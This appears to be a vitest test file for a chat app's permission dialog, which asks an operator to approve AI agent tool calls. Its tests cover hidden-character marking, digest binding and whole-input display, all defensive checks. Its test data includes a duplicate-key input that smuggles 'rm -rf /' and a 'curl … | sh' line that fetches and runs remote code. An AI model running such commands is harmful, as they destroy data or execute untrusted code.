import { readFileSync } from 'node:fs'
import { describe, expect, it } from 'vitest'
import { holdsHidden, markHidden, markWhole } from '../utils/hiddenMarks'
import { canonical, inputDigest, messageBytes, parseStrict, plainOfTool, plainWords, sha256Sync, SHORT_INPUT_ROWS, SHORT_ROW_CHARS, shownInput, summaryLine } from '../utils/permissionInput'
import { MAX_PERMISSION_MESSAGE, permissionAnswerValid } from '../utils/protocol'
import { permissionEnd } from '../utils/transcript'

// A chat's permission question (docs/plans/chat-or-terminal.md, designs 7 and 11). The app's vitest mounts no component: the rules
// are the functions PermissionQuestion.vue draws from (utils/permissionInput.ts, utils/hiddenMarks.ts), and its source is checked for
// the bindings that draw them; what a browser shows is chat-permission.spec.ts's.

const src = readFileSync(new URL('./PermissionQuestion.vue', import.meta.url), 'utf8')
const enc = (s: string) => new TextEncoder().encode(s)
/** A request's entry for an input, its digest the session's (the same canonical form, computed here). */
function entryFor(tool: string, input: string, o: Record<string, unknown> = {}) {
  const v = parseStrict(input)!
  return { tool, plain: plainOfTool(tool), inputSha256: inputDigest(tool, canonical(v)), inputBytes: enc(input).length, ...o }
}
const BS = String.fromCharCode(92)
const esc = (hex: string) => `${BS}u${hex}`

describe('the permission question', () => {
  it('plainWordsByTool: a shell tool reads "Run a command?", an edit "Change a file?", a read "Read a file?", any other "Use a tool?"', () => {
    expect(plainWords(plainOfTool('Bash'))).toBe('Run a command?')
    expect(plainWords(plainOfTool('Edit'))).toBe('Change a file?')
    expect(plainWords(plainOfTool('Write'))).toBe('Change a file?')
    expect(plainWords(plainOfTool('Read'))).toBe('Read a file?')
    expect(plainWords(plainOfTool('mcp__github__create_issue'))).toBe('Use a tool?')
    expect(plainWords(undefined)).toBe('Use a tool?')
    expect(src).toContain('{{ plainWords(entry.plain) }}')
  })

  it('allowWaitsForTheWholeInput: a short input, a description among its fields, is drawn whole at once; a long one only once opened; Allow once waits for its first row and its end', () => {
    const short = '{"command":"echo allowed"}'
    const s = shownInput(entryFor('Bash', short), enc(short))
    expect(s).toMatchObject({ line: 'echo allowed', whole: true, exact: true })
    // Every real Bash call carries a description: still short, drawn whole with no line to open (one press to allow).
    const described = '{"command":"ls -la","description":"List the folder"}'
    const d = shownInput(entryFor('Bash', described), enc(described))
    expect(d).toMatchObject({ line: 'ls -la', whole: true })
    expect(d.rows).toEqual([{ key: 'command', text: 'ls -la' }, { key: 'description', text: 'List the folder' }])
    // The bound: SHORT_INPUT_ROWS rows of SHORT_ROW_CHARS characters, a field's name a row of its own.
    expect([SHORT_INPUT_ROWS, SHORT_ROW_CHARS]).toEqual([8, 80])
    const fits = JSON.stringify({ command: Array.from({ length: 7 }, (_, i) => `echo ${i}`).join('\n') })
    expect(shownInput(entryFor('Bash', fits), enc(fits)).whole).toBe(true)
    const lines = JSON.stringify({ command: Array.from({ length: 8 }, (_, i) => `echo ${i}`).join('\n') })
    expect(shownInput(entryFor('Bash', lines), enc(lines)).whole).toBe(false)
    const wide = JSON.stringify({ command: 'x'.repeat(SHORT_ROW_CHARS * 7 + 1) })
    expect(shownInput(entryFor('Bash', wide), enc(wide)).whole).toBe(false)
    // Allow once: exact, the whole input drawn (short, or opened), and both its first row and its end seen.
    expect(src).toContain('const drawn = computed(() => !!input.value && (short.value || opened.value))')
    expect(src).toContain('const wholeDrawn = computed(() => drawn.value && startSeen.value && endSeen.value)')
    expect(src).toContain('const allowable = computed(() => open.value && props.canAnswer && !!props.entry.tool && !!input.value?.exact && wholeDrawn.value && !sending.value)')
    expect(src).toMatch(/:disabled="!allowable"[^>]*data-permission-allow/)
    // A short input has no line to open: it is drawn at once.
    expect(src).toContain('v-if="!short && line.pieces.length"')
    expect(src).toMatch(/<dl v-if="drawn && input"/)
    // The digest an allow carries is the one computed over the bytes drawn; bytes whose digest is not the request's are not allowable.
    expect(src).toContain("sha256: choice === 'allow_once' ? input.value!.digest")
    expect(shownInput({ ...entryFor('Bash', short), inputSha256: '0'.repeat(64) }, enc(short)).exact).toBe(false)
    // A part kept cut, or not the size the entry says, is not the whole input.
    expect(src).toContain('part.cut || part.total !== props.entry.inputBytes ? { ...shown, exact: false } : shown')
  })

  it("waitsVisibly: while Allow once waits it has a disabled control's neutral look, and one line says what it waits for", () => {
    expect(src).toMatch(/<UButton label="Allow once" size="sm" :color="allowable \? 'warning' : 'neutral'" :variant="allowable \? 'solid' : 'outline'" :disabled="!allowable"/)
    expect(src).toContain("if (!drawn.value) return 'Open the call above and read it whole to allow it.'")
    expect(src).toContain("if (!startSeen.value || !endSeen.value) return 'Read the call from its start to its end to allow it.'")
    expect(src).toMatch(/<p v-if="waiting"[^>]*data-permission-waiting-line>\{\{ waiting \}\}<\/p>/)
  })

  it("aLinksLineIsNeverJson: before its input is read, a question's line is read out of its summary in the line's own form, else none", () => {
    expect(summaryLine({ plain: 'command', summary: '{"command":"for i in 8; do echo $i; done","description":"Count"}' })).toBe('for i in 8; do echo $i; done')
    // A summary the session cut: the value as far as it goes, and the cut said; one cut inside an escape loses its half.
    expect(summaryLine({ plain: 'command', summary: '{"command":"echo a long one that goes on…' })).toBe('echo a long one that goes on…')
    expect(summaryLine({ plain: 'command', summary: `{"command":"echo tab${BS}t and${BS}u00…` })).toBe('echo tab\t and…')
    expect(summaryLine({ plain: 'file', summary: '{"file_path":"/srv/work/main.go","old_string":"a"}' })).toBe('/srv/work/main.go')
    // None to read: the plain words alone, never the JSON.
    expect(summaryLine({ plain: 'tool', summary: '{"owner":"o","repo":"r"}' })).toBe('')
    expect(summaryLine({ plain: 'command', summary: '{"cmd2":"x"}' })).toBe('')
    expect(src).toContain('const line = computed(() => markHidden(input.value ? input.value.line : summaryLine(props.entry)))')
  })

  it("aPathIsNeverCut: a file's path in the line wraps whole; a command's line is one line until opened", () => {
    expect(src).toContain("const pathLine = computed(() => props.entry.plain === 'file' || props.entry.plain === 'read')")
    expect(src).toContain(":class=\"pathLine ? 'break-all whitespace-break-spaces [overflow-wrap:anywhere]' : 'truncate whitespace-pre'\"")
  })

  it('computes the digest the session binds by: canonical JSON as the server writes it, SHA-256 over the tool, a newline and it', () => {
    // A fixture the server's own encoder gave (encoding/json, numbers as written, keys sorted by their bytes, HTML not escaped).
    const input = `{"command":"a${esc('2028')}b${BS}rc<>&${BS}t${esc('0001')}","b":[1.50,-0,1E+5],"${esc('00e9')}":{"z":true,"a":null},"${esc('d83d')}${esc('de00')}":"x","${esc('ffff')}":"y"}`
    const v = parseStrict(input)!
    expect(inputDigest('Bash', canonical(v))).toBe('751d7b03fa031814d1e9c79c4dba87476c5878e632272dbc3552fa0a46c73a3d')
    expect(canonical(parseStrict(`{"b":1.50,"a":{"y":[1,2],"x":"${esc('00e9')}"}}`)!)).toBe('{"a":{"x":"é","y":[1,2]},"b":1.50}')
    expect(sha256Sync(enc(''))).toBe('e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855')
    expect(sha256Sync(enc('a'.repeat(1000)))).toBe('41edece42d63e8d9bf515a9ba6932e1c20cbc9f5a5d134645adb5db1b9737ea3')
    // What the session refuses to take, this refuses to show as exact.
    for (const bad of [`{"command":"${esc('d800')}"}`, `{"command":"a${esc('dc00')}b"}`, '{"command":"ls","command":"rm -rf /"}', '{"a":{"k":1,"k":2}}', '{"a":1}{"b":2}', '{"a":']) {
      expect(parseStrict(bad), bad).toBeUndefined()
    }
    expect(parseStrict(`{"command":"${esc('d83d')}${esc('de00')} and ${BS}${BS}ud800"}`)).toBeDefined()
    expect(shownInput(entryFor('Bash', '{"a":1}'), new Uint8Array([0x7b, 0xff, 0x7d])).exact).toBe(false)
  })

  it('noButtonsForALink: anyone but the operator sees the question and who answers it, never a button', () => {
    expect(src).toMatch(/<template v-if="canAnswer">[\s\S]*data-permission-allow[\s\S]*data-permission-deny[\s\S]*<\/template>\s*<p v-else[^>]*data-permission-operator-only>Only the person who runs this server can answer\.<\/p>/)
    // The page's view of who answers: the chat's own welcome when it has one, else the page's word, and a read-only view never.
    const view = readFileSync(new URL('./ChatView.vue', import.meta.url), 'utf8')
    expect(view).toContain('const canAnswer = computed(() => !props.tile && !props.readOnly && (chatWelcome.value ? !!conn.welcome.value?.permissionAnswer : props.operator))')
    expect(view).toContain(':can-answer="canAnswer"')
  })

  it('drawsHiddenCharactersAsMarks: none of the hidden code points is in the text drawn, each is a mark, and line feeds are breaks', () => {
    const codes = [0x202e, 0x2066, 0x2067, 0x2068, 0x2069, 0x200b, 0xfeff, 0x0d, 0x2028]
    const command = `echo safe${String.fromCodePoint(...codes)}\nnext line\nlast`
    const input = JSON.stringify({ command })
    const s = shownInput(entryFor('Bash', input), enc(input))
    expect(s.exact).toBe(true)
    const { pieces, hidden } = markHidden(s.rows[0]!.text)
    expect(hidden).toBe(true)
    const text = pieces.map((p) => ('text' in p ? p.text : 'mark' in p ? p.mark : '\n')).join('')
    expect([...text].filter((c) => codes.includes(c.codePointAt(0)!))).toEqual([])
    expect(pieces.filter((p) => 'mark' in p).map((p) => ('mark' in p ? p.mark : ''))).toEqual([esc('202E'), esc('2066'), esc('2067'), esc('2068'), esc('2069'), esc('200B'), esc('FEFF'), `${BS}r`, esc('2028')])
    // Two line feeds, two breaks, and no line feed marked.
    expect(pieces.filter((p) => 'br' in p)).toHaveLength(2)
    expect(holdsHidden('one\ntwo')).toBe(false)
    expect(holdsHidden(`one${String.fromCodePoint(0x200b)}`)).toBe(true)
    // The question draws the marks and the breaks, never the text raw, and says so in one line.
    expect(src).toContain('const line = computed(() => markHidden(input.value ? input.value.line : summaryLine(props.entry)))')
    expect(src).toContain('rows.value.some((r) => r.key.hidden || r.value.hidden)')
    expect(src).toContain('This call holds characters that are not shown as typed.')
    expect(src).not.toMatch(/\{\{\s*(input|r\.text|entry\.summary|entry\.cwd)/)
  })

  it('noFolderWithoutASource: a request that names no folder (Claude Code\'s) shows none; one that does (Codex\'s) shows it opened', () => {
    expect(src).toContain('const cwd = computed(() => (props.entry.cwd ? markWhole(props.entry.cwd) : null))')
    expect(src).toMatch(/<div v-if="cwd"[^>]*data-permission-cwd>/)
    // A request that names its folder draws it with the input, a short one at once: the folder counts toward the bound.
    const short = '{"command":"echo allowed"}'
    expect(shownInput(entryFor('Bash', short, { cwd: '/srv/work' }), enc(short)).whole).toBe(true)
    expect(shownInput(entryFor('Bash', short, { cwd: '/srv/' + 'w'.repeat(SHORT_ROW_CHARS * 6) }), enc(short)).whole).toBe(false)
    expect(src.indexOf('data-permission-cwd')).toBeGreaterThan(src.indexOf('<dl v-if="drawn && input"'))
    expect(permissionEnd({ state: 'withdrawn', why: 'The turn was stopped.' })).toBe('The turn was stopped.')
    expect(permissionEnd({ state: 'allowed', byName: 'Nate' })).toBe('Allowed once by Nate.')
  })

  it("drawsTheTool: every question draws its tool's name, marked as text, before Allow once may be offered", () => {
    // Two tools with one input draw the same line: the name is what tells them apart, and the digest binds it.
    const input = '{"owner":"o","repo":"r","pullNumber":5}'
    const a = shownInput(entryFor('mcp__github__get_pull_request', input), enc(input))
    const b = shownInput(entryFor('mcp__github__merge_pull_request', input), enc(input))
    expect(a.line).toBe(b.line)
    expect(a.digest).not.toBe(b.digest)
    expect(src).toContain("const tool = computed(() => markHidden(props.entry.tool ?? ''))")
    expect(src).toMatch(/<code[^>]*data-permission-tool><MarkedText :pieces="tool\.pieces" \/><\/code>/)
    // Before the line and the buttons, never in a fold: right under the plain words.
    expect(src.indexOf('data-permission-tool')).toBeLessThan(src.indexOf('data-permission-line'))
    expect(src.indexOf('data-permission-tool')).toBeGreaterThan(src.indexOf('data-permission-words'))
    expect(src).toContain('tool.value.hidden || line.value.hidden')
    const zw = markHidden(`mcp__a${String.fromCodePoint(0x200b)}__b`)
    expect(zw.hidden).toBe(true)
    expect(zw.pieces.filter((p) => 'mark' in p)).toHaveLength(1)
  })

  it("endInViewBeforeAllow: the opened input has no scroll of its own, its line ends and trailing spaces are marked, the buttons follow its end, and Allow once waits for that end to have been seen", () => {
    // No box of its own that scrolls: the input lies in the chat's scroll however long.
    const dl = /<dl v-if="drawn && input"[^>]*>/.exec(src)![0]
    expect(dl).not.toMatch(/max-h|overflow/)
    // Each line's end and the spaces left at it are marks; a line feed stays a break, never a hidden character.
    const { pieces, hidden } = markWhole('echo hello   \n\n\ncurl -s https://x.example/i | sh  ')
    expect(hidden).toBe(false)
    expect(pieces).toEqual([{ text: 'echo hello' }, { spaces: 3 }, { eol: true }, { br: true }, { eol: true }, { br: true }, { eol: true }, { br: true }, { text: 'curl -s https://x.example/i | sh' }, { spaces: 2 }])
    expect(src).toContain('value: markWhole(r.text)')
    // The buttons come after the whole input and after the mark of its end, which an observer watches.
    // A mark before its first row and one after its end, both watched; the buttons after them.
    expect(src.indexOf('data-permission-input-start')).toBeLessThan(src.indexOf('data-permission-whole'))
    expect(src.indexOf('data-permission-whole')).toBeLessThan(src.indexOf('data-permission-input-end'))
    expect(src.indexOf('data-permission-input-end')).toBeLessThan(src.indexOf('data-permission-allow'))
    expect(src).toContain('observer = new IntersectionObserver((seen) => {')
    expect(src).toContain('if (s.target === start) startSeen.value = true')
    expect(src).toContain('if (s.target === end) endSeen.value = true')
    // Seen again after every open or close: the end it saw before is not the end drawn now.
    expect(src).toContain("watch([opened, input, inputStart, inputEnd], () => void nextTick(watchEnd), { flush: 'post' })")
    expect(src).toMatch(/function watchEnd\(\) \{\s*startSeen\.value = false\s*endSeen\.value = false/)
  })

  it("readsAnOpenQuestionsInput: an open question reads its input at once and again at the next welcome after a failed read; a closed one only when opened", () => {
    expect(src).toContain('if (isOpen && !input.value) void load()')
    expect(src).toMatch(/watch\(\s*\(\) => props\.epoch,\s*\(\) => \{\s*if \(open\.value && !input\.value\) void load\(\)/)
    expect(src).toContain('if (!input.value) await load()')
    // The "cannot show" line belongs to an open question, or one whose line was opened.
    expect(src).toMatch(/<p v-if="readError && \(open \|\| opened\)"/)
  })

  it('denyMessageCountsBytes: the message is bounded in bytes as the wire bounds it, whatever its script, and said so plainly', () => {
    const cjk = String.fromCodePoint(0x65e5).repeat(200)
    expect(cjk.length).toBe(200)
    expect(messageBytes(cjk)).toBe(600)
    expect(permissionAnswerValid({ question: 'q1', call: 'c', sha256: '0'.repeat(64), choice: 'deny', message: cjk })).toBe(false)
    const fits = String.fromCodePoint(0x65e5).repeat(166)
    expect(messageBytes(fits)).toBeLessThanOrEqual(MAX_PERMISSION_MESSAGE)
    expect(permissionAnswerValid({ question: 'q1', call: 'c', sha256: '0'.repeat(64), choice: 'deny', message: fits })).toBe(true)
    expect(src).toContain('const tooLong = computed(() => messageBytes(message.value.trim()) > MAX_PERMISSION_MESSAGE)')
    expect(src).not.toContain(':maxlength=')
    expect(src).toMatch(/<p v-if="tooLong"[^>]*>The message to the agent is too long: it takes at most 500 bytes\.<\/p>/)
    expect(src).toMatch(/:disabled="sending \|\| tooLong" data-permission-deny/)
    // A refusal is said in plain words, never the transport's.
    expect(src).toContain("invalid: 'The message to the agent is too long.'")
    expect(src).not.toContain('(e as Error).message')
  })

  it('wrapsAnywhere: the tool, a field\'s name and its value wrap anywhere, so no run of no-break spaces spills past the chat\'s edge', () => {
    expect(src).toMatch(/<code class="[^"]*\[overflow-wrap:anywhere\][^"]*" data-permission-tool>/)
    expect(src).toMatch(/<dt v-if="r\.key\.pieces\.length" class="[^"]*\[overflow-wrap:anywhere\][^"]*">/)
    expect(src).toMatch(/<dd class="[^"]*\[overflow-wrap:anywhere\][^"]*"><MarkedText :pieces="r\.value\.pieces" \/><\/dd>/)
    expect(src).toMatch(/<dd class="[^"]*\[overflow-wrap:anywhere\][^"]*"><MarkedText :pieces="cwd\.pieces" \/><\/dd>/)
  })
})
